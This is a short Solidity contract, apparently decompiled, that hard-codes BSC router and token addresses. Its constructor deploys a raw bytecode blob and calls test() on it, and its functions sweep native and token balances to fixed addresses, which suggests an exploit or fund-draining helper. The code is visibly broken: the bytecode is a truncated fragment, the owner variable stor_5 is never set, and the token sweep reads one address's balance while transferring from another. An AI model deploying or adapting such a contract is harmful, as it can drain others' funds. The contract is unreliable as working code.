pragma solidity 0.6.12;

contract YourContract {
    address private stor_0;
    address private stor_1;
    address private stor_2;
    address private stor_3;
    address private stor_4;
    address payable private stor_5;
    address private stor_6;

    constructor() payable public {
        stor_0 = 0xd8791F0C10B831B605C5D48959EB763B266940B9;
        stor_1 = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
        stor_2 = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
        stor_3 = 0x55d398326f99059fF775485246999027B3197955;
        stor_4 = 0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d;
        stor_6 = 0x6098A5638d8D7e9Ed2f952d35B2b67c34EC6B476;

        bytes memory code = hex"608060405273d8791f0c10b831b605c5d48959";
        address a1;
        assembly {
            a1 := create(0, add(code, 0x20), mload(code))
        }
        (bool success,) = a1.call(abi.encodePacked(bytes4(keccak256("test()"))));
        require(success, "external call failed");
    }

    function withdraw() public {
        require(msg.sender == stor_5, "Caller is not stor_5");
        (bool success, ) = stor_5.call{value: address(this).balance}("");
        require(success, "Transfer failed");
    }

    function withdrawtoken(address param0) public {
        require(msg.sender == stor_5, "Caller is not stor_5");
        (bool success, bytes memory data) = param0.call(abi.encodePacked(bytes4(keccak256("balanceOf(address)")), 0xeDcfA34E275120E7D18EDbbb0A6171d8ad3CCF54));
        require(success, "External call failed");
        (uint256 balance) = abi.decode(data, (uint256));
        (success, ) = param0.call(abi.encodePacked(bytes4(keccak256("transfer(address,uint256)")), 0x625169Ec47068682EFC1738915F834a90Bf8b805, balance));
        require(success, "External call failed");
    }

    fallback() external payable {}

    receive() external payable {}
}
